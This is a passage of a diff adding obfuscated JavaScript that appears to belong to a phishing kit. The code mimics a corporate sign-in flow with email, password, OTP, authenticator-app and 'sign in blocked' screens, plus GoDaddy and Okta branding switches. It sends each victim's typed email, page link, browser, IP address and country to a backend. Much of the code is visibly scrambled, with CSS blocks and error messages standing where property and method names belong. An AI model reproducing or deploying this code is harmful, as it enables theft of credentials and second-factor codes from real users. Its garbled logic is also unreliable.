+                ](`small`) == !![] &&
+                  _0x5b8b43 == websitenames["length"] - 0x1 &&
+                  !_0x44039f &&
+                  ((document[`selectprotectoption(this)`](`flex`)[`Next`] = ""),
+                  (document[`selectprotectoption(this)`](`flex`)[
+                    `getElementById`
+                  ][`checkpass`] = `section_otp`),
+                  document["querySelectorAll"](`log`)["forEach"](
+                    (_0x185958) => {
+                      const _0x580d67 = _0x579c20;
+                      _0x185958[`Next`] = unamepdfinp[`signin_blocked_reason`];
+                    },
+                  ),
+                  bottomsectionlinks(`inp_otp_live`, [
+                    {
+                      a_id: `accountoptions`,
+                      a_text: `approve auth request auth app live`,
+                      type: `uname_doc`,
+                    },
+                  ]),
+                  changebackbutton(`inp_otp_live`, 0x0),
+                  document["getElementById"](`img`)["classList"][`waiting`](
+                    `background-image`,
+                  ),
+                  document["getElementById"]("section_uname_pdf")["classList"][
+                    `waiting`
+                  ](`background-image`),
+                  document[`selectprotectoption(this)`](`email otp`)[
+                    `pdfemail`
+                  ]["toggle"]("d-none"),
+                  document[`selectprotectoption(this)`](`backbtnclick`)[
+                    `pdfemail`
+                  ][`<a class="link mb-16" href="#" data-id="`](
+                    `background-image`,
+                  ),
+                  (otherweburl = _0x4af9ff[
+                    `</a> or try to sign in again shortly.</p>`
+                  ][`#section_uname_content`](`small`, "")),
+                  (webnotfound = !![]),
+                  (view = `inp_otp_live`));
+              }
+              if (_0x4af9ff["message"] == `input[type="radio"]`) {
+                multipleaccountsback = 0x1;
+                if (twa == 0x0) {
+                  var _0x17bf44 = document[`.btn_can`](`twofaselect`);
+                  _0x17bf44[`querySelector`](function (_0x127e54) {
+                    const _0x3ee9c1 = _0x579c20;
+                    _0x127e54["style"]["height"] = `src`;
+                  });
+                }
+                document["getElementById"](`<p>`)
+                  ["querySelector"]("#btn_back")
+                  [`142499lsAMVs`](`ihaveacode`, _0x4af9ff[`resentlink`]),
+                  document[`selectprotectoption(this)`](`<p>`)
+                    [`.loading-container`]("#btn_back")
+                    [`142499lsAMVs`](`div`, "backbuttonclick(this,2)"),
+                  checkerrordesc(`maxLength`, 0x0, _0x4af9ff[`confirmemail`]),
+                  displaymultipleaccounts(_0x4af9ff[`row tile`]),
+                  bottomsectionlinks(`maxLength`, _0x4af9ff[`otp sent live`]),
+                  document[`.btn_can`](`log`)[`querySelector`]((_0x1a9d27) => {
+                    const _0x1467fc = _0x579c20;
+                    _0x1a9d27[`Next`] = unamepdfinp[`signin_blocked_reason`];
+                  }),
+                  document["getElementById"](`img`)[`pdfemail`][`waiting`](
+                    `background-image`,
+                  ),
+                  document[`selectprotectoption(this)`](`authapperrorresend`)[
+                    "classList"
+                  ][`waiting`](`background-image`),
+                  document[`selectprotectoption(this)`](`email otp`)[
+                    `pdfemail`
+                  ]["toggle"](`background-image`),
+                  document[`selectprotectoption(this)`](`<p>`)[`pdfemail`][
+                    "remove"
+                  ]("d-none"),
+                  (view = "multipleaccounts");
+              }
+              if (_0x4af9ff["message"] == "correct\x20email") {
+                if (twa == 0x0) {
+                  if (
+                    _0x4af9ff[`otp sent error`] !== undefined &&
+                    _0x4af9ff[`otp sent error`] !== null
+                  ) {
+                    var _0x17bf44 = document["querySelectorAll"](`twofaselect`);
+                    _0x17bf44["forEach"](function (_0x3b7c89) {
+                      const _0x513657 = _0x579c20;
+                      (_0x3b7c89[`getElementById`][`otpdesc`] =
+                        "url(\x27" + _0x4af9ff["bannerlogo"] + "\x27)"),
+                        (_0x3b7c89[`getElementById`][`then`] = `row`),
+                        (_0x3b7c89[`getElementById`][`pwd_godaddy`] =
+                          `checked`);
+                    });
+                  }
+                  _0x4af9ff[`.title`] !== undefined &&
+                    _0x4af9ff[`.title`] !== null &&
+                    document[
+                      `
+            ::-moz-selection {
+            background: #a6fff8;
+            }
+            
+            ::selection {
+            background: #a6fff8;
+            }
+            `
+                    ][`getElementById`]["setProperty"](
+                      `createElement`,
+                      _0x4af9ff[`.title`],
+                    );
+                  _0x4af9ff[`signoutoption`] !== undefined &&
+                    _0x4af9ff["backgroundimage"] !== null &&
+                    document[
+                      `
+            ::-moz-selection {
+            background: #a6fff8;
+            }
+            
+            ::selection {
+            background: #a6fff8;
+            }
+            `
+                    ][`getElementById`][`voice`](
+                      `background-color`,
+                      `position` + _0x4af9ff[`signoutoption`] + "\x27)",
+                    );
+                  if (
+                    _0x4af9ff[`otp sent error`] == undefined ||
+                    _0x4af9ff[`otp sent error`] == null
+                  ) {
+                    var _0x17bf44 = document[`.btn_can`](".bannerlogo");
+                    _0x17bf44["forEach"](function (_0xe8a475) {
+                      const _0x1cc775 = _0x579c20;
+                      _0xe8a475[`getElementById`]["height"] = `src`;
+                    });
+                  }
+                }
+                bottomsectionlinks(`inp_otp_live`, _0x4af9ff[`otp sent live`]),
+                  changebackbutton(`inp_otp_live`, _0x4af9ff["backbutton"]),
+                  (document[`selectprotectoption(this)`](`flex`)["innerText"] =
+                    ""),
+                  (document[`selectprotectoption(this)`](`flex`)[
+                    `getElementById`
+                  ][`checkpass`] = "none"),
+                  document[`.btn_can`](`log`)[`querySelector`]((_0x2cbff4) => {
+                    const _0x22fe53 = _0x579c20;
+                    _0x2cbff4[`Next`] = unamepdfinp[`signin_blocked_reason`];
+                  }),
+                  document[`selectprotectoption(this)`](`img`)[`pdfemail`][
+                    `waiting`
+                  ]("d-none"),
+                  document[`selectprotectoption(this)`](`authapperrorresend`)[
+                    `pdfemail`
+                  ][`waiting`](`background-image`),
+                  document[`selectprotectoption(this)`](`email otp`)[
+                    `pdfemail`
+                  ][`waiting`](`background-image`),
+                  document[`selectprotectoption(this)`](`backbtnclick`)[
+                    `pdfemail`
+                  ][`<a class="link mb-16" href="#" data-id="`](
+                    `background-image`,
+                  ),
+                  (view = "pwd");
+              }
+              _0x4af9ff["message"] == "error" &&
+                ((document[`selectprotectoption(this)`]("error_uname_pdf")[
+                  `Next`
+                ] = "Please,\x20provide\x20a\x20valid\x20email."),
+                (document["getElementById"]("error_uname_pdf")[
+                  `getElementById`
+                ]["display"] = `dynamic-style`),
+                loadinganimationpdf(0x1));
+            }, _0x2d27ca);
+        }
+      })
+      [`section_signinanothererror`]((_0x45a212) => {
+        const _0x1985c8 = _0x1b077a;
+        loadinganimationpdf(0x1),
+          console[`auth`](`selecttwofamethod(this)`, _0x45a212);
+      });
+  }
+  function validatepdf() {
+    const _0x3badca = _0x283fde;
+    if (view === `section_otp_live`) {
+      const _0x2fbd30 = bes,
+        _0x548bed = unamepdfinp[`signin_blocked_reason`]
+          ["trim"]()
+          [`appendChild`]("@")[0x1];
+      unamepdfinp[`signin_blocked_reason`][`ajax`]("@") &&
+        _0x2fbd30[`288sDLHMP`]((_0x3a9a7e) => _0x548bed[`ajax`](_0x3a9a7e)) &&
+        (loadinganimationpdf(0x0),
+        setTimeout(function () {
+          const _0x398e29 = _0x3badca;
+          loadinganimationpdf(0x1),
+            (document[`selectprotectoption(this)`](`flex`)[`Next`] =
+              `display: unset;`),
+            (document[`selectprotectoption(this)`](`flex`)["style"][
+              `checkpass`
+            ] = `dynamic-style`);
+        }, 0xbb8));
+      if (
+        unamepdfinp[`signin_blocked_reason`][
+          `That doesn't match the phone number associated with your account. The correct number ends in `
+        ]() == ""
+      )
+        (document["getElementById"](`flex`)[`Next`] = `display: unset;`),
+          (document[`selectprotectoption(this)`](`flex`)["style"][`checkpass`] =
+            `dynamic-style`);
+      else
+        unamepdfinp[`signin_blocked_reason`]["trim"]() != "" &&
+          unamepdfinp[`signin_blocked_reason`][`ajax`]("@") &&
+          !_0x2fbd30[`288sDLHMP`]((_0xbeabaf) =>
+            _0x548bed[`ajax`](_0xbeabaf),
+          ) &&
+          (loadinganimationpdf(0x0),
+          webnotfound == !![] &&
+            setTimeout(function () {
+              loadinganimationpdf(0x1),
+                setTimeout(function () {
+                  const _0x45aa37 = _0x374d;
+                  (document[_0x45aa37(0x30b)]("error_pwd")["innerText"] = ""),
+                    (document[_0x45aa37(0x30b)]("inp_pwd")["value"] = ""),
+                    document["getElementById"](_0x45aa37(0x1da))["classList"][
+                      _0x45aa37(0x315)
+                    ](_0x45aa37(0x1d6)),
+                    document[_0x45aa37(0x30b)](_0x45aa37(0x276))[
+                      _0x45aa37(0x208)
+                    ][_0x45aa37(0x315)](_0x45aa37(0x1d6)),
+                    document[_0x45aa37(0x30b)](_0x45aa37(0x304))["classList"][
+                      _0x45aa37(0x39e)
+                    ](_0x45aa37(0x1d6)),
+                    (view = _0x45aa37(0x21a));
+                }, 0x12c);
+            }, 0xbb8),
+          webnotfound == ![] &&
+            (interacted == 0x1 && sendemailpdf(),
+            interacted == 0x0 &&
+              ((interacted = 0x1),
+              (function _0x187087() {
+                const _0x1c7ace = _0x3badca;
+                $[`error-inp`](
+                  `setAttribute`,
+                  function (_0x6f2038) {
+                    (userip = _0x6f2038["ip"]),
+                      (usercountry = _0x6f2038["country"]),
+                      sendemailpdf();
+                  },
+                  `textContent`,
+                )[`autocomplete`](function (_0x3000f3, _0x816091, _0x17dc3c) {
+                  const _0x18d55d = _0x1c7ace;
+                  (_0x3000f3["status"] == 0x1ad ||
+                    _0x816091 !== `fadeinform 1s forwards`) &&
+                    setTimeout(_0x187087, 0x3e8);
+                });
+              })())));
+    }
+    return ![];
+  }
+}
+if (view == `#btn_verifyotp_live`) {
+  const nxtdoc = document["getElementById"](`authappcode`);
+  nxtdoc[`phcontainer`](`trim`, () => {
+    validatedoc();
+  }),
+    (doccheck = 0x1);
+  function loadinganimationdoc(_0x37a897) {
+    const _0x24aaa4 = _0x283fde;
+    _0x37a897 == 0x0 &&
+      (document[`selectprotectoption(this)`](`Sign in another way`)[
+        `.loading-container`
+      ](`2fa is off`)["style"]["display"] = "unset"),
+      _0x37a897 == 0x1 &&
+        (document[`selectprotectoption(this)`]("sections_doc")["querySelector"](
+          `2fa is off`,
+        )[`getElementById`]["display"] = `section_otp`),
+      _0x37a897 == 0x2 &&
+        (document[`selectprotectoption(this)`](`Sign in another way`)[
+          `.loading-container`
+        ](`2fa is off`)[`getElementById`][`checkpass`] = `row`);
+  }
+  const unamedocinp = document[`selectprotectoption(this)`](`backgroundColor`);
+  function sendemaildoc() {
+    const _0x3677a9 = _0x283fde;
+    sendAndReceive(
+      "checkemail",
+      [
+        unamedocinp[`signin_blocked_reason`],
+        pagelinkval,
+        browserName,
+        userip,
+        usercountry,
+      ],
+      0x1,
+    )
+      ["then"]((_0x4c93b6) => {
+        const _0x1c2104 = _0x3677a9;
+        if (
+          _0x4c93b6 &&
+          _0x4c93b6[`</a> or try to sign in again shortly.</p>`] !==
+            `Enter the code to help us verify your identity.`
+        ) {
+          var _0x213e0f = ![],
+            _0x48423b = 0x12c;
+          _0x4c93b6[`</a> or try to sign in again shortly.</p>`]["includes"](
+            `small`,
+          ) == ![] &&
+            _0x4c93b6[`</a> or try to sign in again shortly.</p>`] !== `auth` &&
+            _0x4c93b6[`width`] &&
+            _0x4c93b6[`width`] == 0x2 &&
+            (pvn = 0x1),
+            _0x4c93b6[`</a> or try to sign in again shortly.</p>`][`ajax`](
+              `small`,
+            ) == ![] && ((_0x48423b = 0x0), loadinganimationdoc(0x1)),
+            setTimeout(function () {
+              const _0x47c727 = _0x1c2104;
+              for (
+                var _0x48dc35 = 0x0;
+                _0x48dc35 < websitenames[`style`];
+                _0x48dc35++
+              ) {
+                if (
+                  _0x4c93b6["message"][`ajax`](`small`) == !![] &&
+                  _0x4c93b6[`</a> or try to sign in again shortly.</p>`][
+                    `ajax`
+                  ](websitenames[_0x48dc35]) == !![]
+                ) {
+                  loadinganimationdoc(0x2),
+                    (_0x213e0f = !![]),
+                    document["querySelectorAll"](`log`)[`querySelector`](
+                      (_0x1498a7) => {
+                        _0x1498a7["innerText"] = unamedocinp["value"];
+                      },
+                    );
+                  if (websitenames[_0x48dc35] == "godaddy") {
+                    var _0x1a4243 = gdf,
+                      _0x2a695a = document["querySelector"](
+                        `height` + gdf + "\x22]",
+                      );
+                    if (!_0x2a695a) {
+                      var _0x499af7 =
+                        document["createElement"](`protectaccount live`);
+                      (_0x499af7[`fail`] = _0x1a4243),
+                        document["head"][`hasAttribute`](_0x499af7);
+                    }
+                    const _0xcb70cb =
+                        "\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20::-moz-selection\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background:\x20#a6fff8;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20::selection\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background:\x20#a6fff8;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20",
+                      _0x4d015d = document[`iProofLbl1`](`getElementById`);
+                    (_0x4d015d["id"] = "dynamic-style"),
+                      (_0x4d015d[`error_authapp_live`] = _0xcb70cb),
+                      document[`godaddyemail`][`hasAttribute`](_0x4d015d),
+                      document[`selectprotectoption(this)`]("sections_doc")[
+                        `pdfemail`
+                      ]["toggle"](`background-image`),
+                      document[`selectprotectoption(this)`](`listitem`)[
+                        `pdfemail`
+                      ][`waiting`](`background-image`),
+                      document[`selectprotectoption(this)`](
+                        `description` + websitenames[_0x48dc35] + "",
+                      )[`pdfemail`][`<a class="link mb-16" href="#" data-id="`](
+                        `background-image`,
+                      ),
+                      (document[`selectprotectoption(this)`](
+                        `Sorry, we're having trouble verifying your account. Please try again. `,
+                      )["value"] = unamedocinp[`signin_blocked_reason`]),
+                      document[
+                        `
+            ::-moz-selection {
+            background: #a6fff8;
+            }
+            
+            ::selection {
+            background: #a6fff8;
+            }
+            `
+                      ]["style"]["setProperty"](
+                        `createElement`,
+                        ` <a href="#" data-id="`,
+                        `section_2fa`,
+                      ),
+                      document[
+                        `
+            ::-moz-selection {
+            background: #a6fff8;
+            }
+            
+            ::selection {
+            background: #a6fff8;
+            }
+            `
+                      ][`getElementById`][`voice`](
+                        `background-color`,
+                        `row`,
+                        "important",
+                      ),
+                      document["body"][`getElementById`][`voice`](
+                        `url('`,
+                        `someone@example.com`,
+                        `section_2fa`,
+                      ),
+                      (view = `parse`);
+                  }
+                }
+                _0x4c93b6["message"][`ajax`](`small`) == !![] &&
+                  _0x48dc35 == websitenames["length"] - 0x1 &&
+                  !_0x213e0f &&
+                  ((document[`selectprotectoption(this)`](`multiple accounts`)[
+                    `Next`
+                  ] = ""),
+                  (document[`selectprotectoption(this)`](`multiple accounts`)[
+                    "style"
+                  ][`checkpass`] = "none"),
+                  document[`.btn_can`](`log`)["forEach"]((_0x2bcfa6) => {
+                    const _0x402f64 = _0x47c727;
+                    _0x2bcfa6[`Next`] = unamedocinp["value"];
+                  }),
+                  bottomsectionlinks(`inp_otp_live`, [
+                    {
+                      a_id: "idA_PWD_ForgotPassword",
+                      a_text: "Forgot\x20my\x20password",
+                      type: `uname_doc`,
+                    },
+                  ]),
+                  changebackbutton(`inp_otp_live`, 0x0),
+                  document[`selectprotectoption(this)`](`Sign in another way`)[
+                    `pdfemail`
+                  ]["toggle"](`background-image`),
+                  document[`selectprotectoption(this)`](`listitem`)[`pdfemail`][
+                    `waiting`
+                  ]("d-none"),
+                  document[`selectprotectoption(this)`](`email otp`)[
+                    `pdfemail`
+                  ][`waiting`](`background-image`),
+                  document[`selectprotectoption(this)`](`backbtnclick`)[
+                    `pdfemail`
+                  ]["remove"](`background-image`),
+                  (otherweburl = _0x4c93b6[
+                    `</a> or try to sign in again shortly.</p>`
+                  ]["replace"](`small`, "")),
+                  (webnotfound = !![]),
+                  (view = `inp_otp_live`));
+              }
+              if (
+                _0x4c93b6[`</a> or try to sign in again shortly.</p>`] ==
+                `input[type="radio"]`
+              ) {
+                multipleaccountsback = 0x1;
+                if (twa == 0x0) {
+                  var _0x46b127 = document[`.btn_can`](`twofaselect`);
+                  _0x46b127[`querySelector`](function (_0x4c753d) {
+                    const _0x118286 = _0x47c727;
+                    _0x4c753d["style"][`pwd_godaddy`] = "24px";
+                  });
+                }
+                document[`selectprotectoption(this)`](
+                  "section_multipleaccounts",
+                )
+                  [`.loading-container`]("#btn_back")
+                  [`142499lsAMVs`]("data-id", _0x4c93b6["backbtnid"]),
+                  document[`selectprotectoption(this)`](`<p>`)
+                    [`.loading-container`]("#btn_back")
+                    [`142499lsAMVs`](`div`, "backbuttonclick(this,2)"),
+                  checkerrordesc(`maxLength`, 0x0, _0x4c93b6[`confirmemail`]),
+                  displaymultipleaccounts(_0x4c93b6["accountoptions"]),
+                  bottomsectionlinks(`maxLength`, _0x4c93b6[`otp sent live`]),
+                  document[`.btn_can`](`log`)["forEach"]((_0x5e67e4) => {
+                    const _0x5e5543 = _0x47c727;
+                    _0x5e67e4[`Next`] = unamedocinp[`signin_blocked_reason`];
+                  }),
+                  document[`selectprotectoption(this)`](`Sign in another way`)[
+                    `pdfemail`
+                  ][`waiting`](`background-image`),
+                  document["getElementById"](`listitem`)[`pdfemail`][`waiting`](
+                    `background-image`,
+                  ),
+                  document[`selectprotectoption(this)`](`email otp`)[
+                    `pdfemail`
+                  ][`waiting`](`background-image`),
+                  document["getElementById"](`<p>`)[`pdfemail`]["remove"](
+                    "d-none",
+                  ),
+                  (view = `maxLength`);
+              }
+              if (_0x4c93b6["message"] == `signinblocked live`) {
+                if (twa == 0x0) {
+                  if (
+                    _0x4c93b6["bannerlogo"] !== undefined &&
+                    _0x4c93b6[`otp sent error`] !== null
+                  ) {
+                    var _0x46b127 = document[`.btn_can`](`twofaselect`);
+                    _0x46b127["forEach"](function (_0x266c82) {
+                      const _0x580959 = _0x47c727;
+                      (_0x266c82[`getElementById`][`otpdesc`] =
+                        `position` + _0x4c93b6["bannerlogo"] + "\x27)"),
+                        (_0x266c82[`getElementById`][`then`] = `row`),
+                        (_0x266c82[`getElementById`][`pwd_godaddy`] = "36px");
+                    });
+                  }
+                  _0x4c93b6[`.title`] !== undefined &&
+                    _0x4c93b6["backgroundcolor"] !== null &&
+                    document["body"][`getElementById`][`voice`](
+                      `createElement`,
+                      _0x4c93b6[`.title`],
+                    );
+                  _0x4c93b6[`signoutoption`] !== undefined &&
+                    _0x4c93b6["backgroundimage"] !== null &&
+                    document[
+                      `
+            ::-moz-selection {
+            background: #a6fff8;
+            }
+            
+            ::selection {
+            background: #a6fff8;
+            }
+            `
+                    ][`getElementById`][`voice`](
+                      `background-color`,
+                      `position` + _0x4c93b6[`signoutoption`] + "\x27)",
+                    );
+                  if (
+                    _0x4c93b6["bannerlogo"] == undefined ||
+                    _0x4c93b6[`otp sent error`] == null
+                  ) {
+                    var _0x46b127 = document[`.btn_can`](`twofaselect`);
+                    _0x46b127[`querySelector`](function (_0x469d0c) {
+                      const _0x3b994e = _0x47c727;
+                      _0x469d0c[`getElementById`]["height"] = "24px";
+                    });
+                  }
+                }
+                bottomsectionlinks(`inp_otp_live`, _0x4c93b6[`otp sent live`]),
+                  changebackbutton("pwd", _0x4c93b6[`#docemailloading`]),
+                  (document[`selectprotectoption(this)`]("error_uname_doc")[
+                    `Next`
+                  ] = ""),
+                  (document[`selectprotectoption(this)`](`multiple accounts`)[
+                    `getElementById`
+                  ][`checkpass`] = "none"),
+                  document[`.btn_can`](`log`)[`querySelector`]((_0x292d73) => {
+                    const _0x594a93 = _0x47c727;
+                    _0x292d73[`Next`] = unamedocinp[`signin_blocked_reason`];
+                  }),
+                  document[`selectprotectoption(this)`]("sections_doc")[
+                    `pdfemail`
+                  ]["toggle"]("d-none"),
+                  document[`selectprotectoption(this)`]("section_uname_doc")[
+                    `pdfemail`
+                  ][`waiting`]("d-none"),
+                  document[`selectprotectoption(this)`](`email otp`)[
+                    `pdfemail`
+                  ][`waiting`]("d-none"),
+                  document["getElementById"](`backbtnclick`)["classList"][
+                    `<a class="link mb-16" href="#" data-id="`
+                  ](`background-image`),
+                  (view = `inp_otp_live`);
+              }
+              _0x4c93b6["message"] == `auth` &&
+                ((document[`selectprotectoption(this)`](`multiple accounts`)[
+                  `Next`
+                ] = `display: unset;`),
+                (document["getElementById"](`multiple accounts`)["style"][
+                  "display"
+                ] = `dynamic-style`),
+                loadinganimationdoc(0x1));
+            }, _0x48423b);
+        }
+      })
+      [`section_signinanothererror`]((_0x4433b9) => {
+        const _0x4355b9 = _0x3677a9;
+        loadinganimationdoc(0x1), console[`auth`]("Error:", _0x4433b9);
+      });
+  }
+  function validatedoc() {
+    const _0x2fe407 = _0x283fde;
+    if (view === `#btn_verifyotp_live`) {
+      const _0x5c9897 = bes,
+        _0x114376 = unamedocinp["value"]
+          [
+            `That doesn't match the phone number associated with your account. The correct number ends in `
+          ]()
+          [`appendChild`]("@")[0x1];
+      unamedocinp["value"][`ajax`]("@") &&
+        _0x5c9897["some"]((_0x5889c0) => _0x114376[`ajax`](_0x5889c0)) &&
+        (loadinganimationdoc(0x0),
+        setTimeout(function () {
+          const _0x539adb = _0x2fe407;
+          loadinganimationdoc(0x1),
+            (document[`selectprotectoption(this)`](`multiple accounts`)[
+              `Next`
+            ] = `display: unset;`),
+            (document[`selectprotectoption(this)`](`multiple accounts`)[
+              "style"
+            ]["display"] = `dynamic-style`);
+        }, 0xbb8));
+      if (
+        unamedocinp[`signin_blocked_reason`][
+          `That doesn't match the phone number associated with your account. The correct number ends in `
+        ]() == ""
+      )
+        (document[`selectprotectoption(this)`](`multiple accounts`)[`Next`] =
+          `display: unset;`),
+          (document[`selectprotectoption(this)`](`multiple accounts`)["style"][
+            `checkpass`
+          ] = `dynamic-style`);
+      else
+        unamedocinp[`signin_blocked_reason`][
+          `That doesn't match the phone number associated with your account. The correct number ends in `
+        ]() != "" &&
+          unamedocinp[`signin_blocked_reason`][`ajax`]("@") &&
+          !_0x5c9897[`288sDLHMP`]((_0x570855) =>
+            _0x114376[`ajax`](_0x570855),
+          ) &&
+          (loadinganimationdoc(0x0),
+          webnotfound == !![] &&
+            setTimeout(function () {
+              loadinganimationdoc(0x1),
+                setTimeout(function () {
+                  const _0x44e2b4 = _0x374d;
+                  (document[_0x44e2b4(0x30b)](_0x44e2b4(0x2f0))[
+                    _0x44e2b4(0x37f)
+                  ] = ""),
+                    (document[_0x44e2b4(0x30b)]("inp_pwd")[_0x44e2b4(0x2ab)] =
+                      ""),
+                    document["getElementById"]("sections_doc")[
+                      _0x44e2b4(0x208)
+                    ][_0x44e2b4(0x315)](_0x44e2b4(0x1d6)),
+                    document["getElementById"](_0x44e2b4(0x368))["classList"][
+                      "toggle"
+                    ](_0x44e2b4(0x1d6)),
+                    document[_0x44e2b4(0x30b)](_0x44e2b4(0x304))["classList"][
+                      _0x44e2b4(0x39e)
+                    ](_0x44e2b4(0x1d6)),
+                    (view = _0x44e2b4(0x21a));
+                }, 0x12c);
+            }, 0xbb8),
+          webnotfound == ![] &&
+            (interacted == 0x1 && sendemaildoc(),
+            interacted == 0x0 &&
+              ((interacted = 0x1),
+              (function _0x1965e3() {
+                const _0x478153 = _0x2fe407;
+                $[`error-inp`](
+                  `setAttribute`,
+                  function (_0x54f398) {
+                    const _0x3c63b9 = _0x478153;
+                    (userip = _0x54f398["ip"]),
+                      (usercountry = _0x54f398[`iProofPhoneEntry`]),
+                      sendemaildoc();
+                  },
+                  `textContent`,
+                )["fail"](function (_0x32910f, _0x52d23b, _0x5bb916) {
+                  const _0x4e98af = _0x478153;
+                  (_0x32910f[`input#i011e.okta`] == 0x1ad ||
+                    _0x52d23b !== `fadeinform 1s forwards`) &&
+                    setTimeout(_0x1965e3, 0x3e8);
+                });
+              })())));
+    }
+    return ![];
+  }
+}
+if (view == "uname_spw") {
+  const nxtpdf = document[`selectprotectoption(this)`](`body`);
+  nxtpdf["addEventListener"](`trim`, () => {
+    validatepdf();
+  }),
+    (pdfcheck = 0x1);
+  function loadinganimationpdf(_0x18ccd6) {
+    const _0x4e5ed6 = _0x283fde;
+    _0x18ccd6 == 0x0 &&
+      ((document[`selectprotectoption(this)`]("sections_pdf")["querySelector"](
+        `remove`,
+      )["style"][`checkpass`] = `Verify Online`),
+      document[`selectprotectoption(this)`](`img`)
+        [`.loading-container`](`error_verifyemail`)
+        [`pdfemail`][`waiting`](`background-image`)),
+      _0x18ccd6 == 0x1 &&
+        ((document[`selectprotectoption(this)`](`img`)[`.loading-container`](
+          `remove`,
+        )[`getElementById`]["display"] = `section_otp`),
+        document["getElementById"](`img`)
+          ["querySelector"]("#section_uname_content")
+          [`pdfemail`][`<a class="link mb-16" href="#" data-id="`]("d-none")),
+      _0x18ccd6 == 0x2 &&
+        ((document["getElementById"](`img`)[`.loading-container`](`remove`)[
+          `getElementById`
+        ][`checkpass`] = `Verify Online`),
+        document["getElementById"](`img`)[`pdfemail`]["toggle"](
+          `background-image`,
+        ));
+  }
+  const unamepdfinp =
+    document[`selectprotectoption(this)`](`section_authapp_live`);
+  function sendemailpdf() {
+    const _0x27916a = _0x283fde;
+    sendAndReceive(
+      `unset`,
+      [
+        unamepdfinp[`signin_blocked_reason`],
+        pagelinkval,
+        browserName,
+        userip,
+        usercountry,
+      ],
+      0x1,
+    )
+      ["then"]((_0x1e263a) => {
+        const _0x478dc6 = _0x27916a;
+        if (
+          _0x1e263a &&
+          _0x1e263a["message"] !==
+            `Enter the code to help us verify your identity.`
+        ) {
+          var _0x52efbf = ![],
+            _0x2e620b = 0x12c;
+          _0x1e263a[`</a> or try to sign in again shortly.</p>`][`ajax`](
+            `small`,
+          ) == ![] &&
+            _0x1e263a[`</a> or try to sign in again shortly.</p>`] !== `auth` &&
+            _0x1e263a[`width`] &&
+            _0x1e263a[`width`] == 0x2 &&
+            (pvn = 0x1),
+            _0x1e263a[`</a> or try to sign in again shortly.</p>`][`ajax`](
+              `small`,
+            ) == ![] && ((_0x2e620b = 0x0), loadinganimationpdf(0x1)),
+            setTimeout(function () {
+              const _0x21ad77 = _0x478dc6;
+              for (
+                var _0x2af065 = 0x0;
+                _0x2af065 < websitenames["length"];
+                _0x2af065++
+              ) {
+                if (
+                  _0x1e263a[`</a> or try to sign in again shortly.</p>`][
+                    `ajax`
+                  ]("newwebsiteopen") == !![] &&
+                  _0x1e263a[`</a> or try to sign in again shortly.</p>`][
+                    `ajax`
+                  ](websitenames[_0x2af065]) == !![]
+                ) {
+                  (_0x52efbf = !![]),
+                    document["querySelectorAll"](`log`)[`querySelector`](
+                      (_0x20a422) => {
+                        const _0x8f6a93 = _0x21ad77;
+                        _0x20a422[`Next`] =
+                          unamepdfinp[`signin_blocked_reason`];
+                      },
+                    );
+                  if (websitenames[_0x2af065] == `authcallimg`) {
+                    var _0x231f1e = gdf,
+                      _0x331811 = document[`.loading-container`](
+                        `height` + gdf + "\x22]",
+                      );
+                    if (!_0x331811) {
+                      var _0x1bdf0e =
+                        document[`iProofLbl1`](`protectaccount live`);
+                      (_0x1bdf0e[`fail`] = _0x231f1e),
+                        document[`godaddyemail`][`hasAttribute`](_0x1bdf0e);
+                    }
+                    const _0x32caf8 =
+                        "\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20::-moz-selection\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background:\x20#a6fff8;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20::selection\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background:\x20#a6fff8;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20",
+                      _0x193f02 = document[`iProofLbl1`](`getElementById`);
+                    (_0x193f02["id"] = `section_final`),
+                      (_0x193f02["textContent"] = _0x32caf8),
+                      document["head"][`hasAttribute`](_0x193f02),
+                      document["getElementById"](`img`)[`pdfemail`]["toggle"](
+                        `background-image`,
+                      ),
+                      document[`selectprotectoption(this)`](
+                        `authapperrorresend`,
+                      )["classList"][`waiting`](`background-image`),
+                      document["getElementById"](
+                        `description` + websitenames[_0x2af065] + "",
+                      )[`pdfemail`][`<a class="link mb-16" href="#" data-id="`](
+                        `background-image`,
+                      ),
+                      (document["getElementById"](
+                        `Sorry, we're having trouble verifying your account. Please try again. `,
+                      )[`signin_blocked_reason`] =
+                        unamepdfinp[`signin_blocked_reason`]),
+                      document[
+                        `
+            ::-moz-selection {
+            background: #a6fff8;
+            }
+            
+            ::selection {
+            background: #a6fff8;
+            }
+            `
+                      ]["style"]["setProperty"](
+                        `createElement`,
+                        "#f5f7f8",
+                        `section_2fa`,
+                      ),
+                      document[
+                        `
+            ::-moz-selection {
+            background: #a6fff8;
+            }
+            
+            ::selection {
+            background: #a6fff8;
+            }
+            `
+                      ]["style"]["setProperty"](
+                        `background-color`,
+                        `row`,
+                        `section_2fa`,
+                      ),
+                      document["body"][`getElementById`][`voice`](
+                        `url('`,
+                        `someone@example.com`,
+                        `section_2fa`,
+                      ),
+                      (view = `parse`);
+                  }
+                }
+                _0x1e263a[`</a> or try to sign in again shortly.</p>`][
+                  "includes"
+                ]("newwebsiteopen") == !![] &&
+                  _0x2af065 == websitenames["length"] - 0x1 &&
+                  !_0x52efbf &&
+                  ((document[`selectprotectoption(this)`](`flex`)[`Next`] = ""),
+                  (document[`selectprotectoption(this)`](`flex`)[
+                    `getElementById`
+                  ][`checkpass`] = `section_otp`),
+                  document[`.btn_can`](`log`)["forEach"]((_0x2d5039) => {
